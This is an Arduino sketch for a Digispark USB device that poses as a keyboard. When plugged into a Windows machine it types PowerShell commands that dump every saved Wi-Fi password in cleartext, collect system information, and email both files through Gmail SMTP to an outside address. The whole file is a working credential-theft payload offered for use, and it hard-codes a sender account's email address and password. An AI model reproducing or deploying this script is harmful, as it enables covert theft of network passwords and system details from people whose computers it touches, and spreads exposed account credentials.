#define kbd_tr_tr
#include "DigiKeyboard.h"

int limit = 1;
int current = 0;


void setup() {

  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
}

void loop() {

  if (limit > current) {

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    //saveInfo
    DigiKeyboard.print("netsh wlan show profile name=\'*\' key=clear > pass.txt");
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("systeminfo > sysinfo.txt");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    //sendMail
    DigiKeyboard.print(F("$Message = New-Object System.Net.Mail.MailMessage 'cyberoz.system@gmail.com','oglcnkcr54_kcr@outlook.com'"));
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Message.Subject = 'GetInfoForDigi'");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Message.Body = 'Bilgisayardan gelen bilgiler'");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Message.Attachments.Add('sysinfo.txt')");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Message.Attachments.Add('pass.txt')");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', '587')");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Smtp.EnableSsl = $true");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("$Smtp.Credentials = New-Object System.Net.NetworkCredential('cyberoz.system@gmail.com', 'Cyber1.1')"));
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("$Smtp.Send($Message)");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);


 
    //isFinish
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
   
   

    current = current + 1;
  }

}
